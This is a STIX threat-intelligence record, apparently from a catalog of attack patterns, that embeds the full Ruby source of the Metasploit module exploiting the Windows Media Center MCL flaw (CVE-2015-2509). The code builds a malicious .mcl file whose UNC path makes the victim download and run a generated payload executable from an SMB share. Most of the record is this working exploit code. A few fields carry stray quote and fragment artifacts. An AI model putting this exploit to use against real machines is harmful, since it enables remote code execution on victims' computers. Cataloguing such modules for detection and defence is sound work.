{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b45bc4f-89cc-4639-99bb-ad9cceefefd8",
    "created": "2024-08-14T16:38:12.433087Z",
    "modified": "2024-08-14T16:38:12.433091Z",
    "name": "\"MS15-100 Microsoft Windows Media Center MCL Vulnerability\"",
    "description": " This module exploits a vulnerability in Windows Media Center. By supplying an UNC path in the *.mcl file, a remote file will be automatically downloaded which can result in arbitrary code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms15_100_mcl_exe.rb",
            "external_id": "ms15_100_mcl_exe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2509"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::SMB::Server::Share\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS15-100 Microsoft Windows Media Center MCL Vulnerability\",\n      'Description'    => %q{\n        This module exploits a vulnerability in Windows Media Center. By supplying\n        an UNC path in the *.mcl file, a remote file will be automatically downloaded,\n        which can result in arbitrary code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'sinn3r',\n        ],\n      'References'     =>\n        [\n          ['CVE', '2015-2509'],\n          ['MSB', 'MS15-100']\n        ],\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'DefaultOptions' =>\n        {\n          'DisablePayloadHandler' => false\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows', {}],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2015-09-08',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [true, 'The MCL file', 'msf.mcl']),\n          OptString.new('FILE_NAME', [ false, 'The name of the malicious payload to execute', 'msf.exe'])\n        ])\n\n      deregister_options('FILE_CONTENTS')\n  end\n\n  def generate_mcl\n    %Q|<application run=\"#{unc}\" />|\n  end\n\n  def primer\n    self.file_contents = generate_payload_exe\n    print_status(\"Malicious executable at #{unc}...\")\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    mcl = generate_mcl\n    file_create(mcl)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-09-08",
    "x_mitre_platforms": [
        "win'"
    ]
}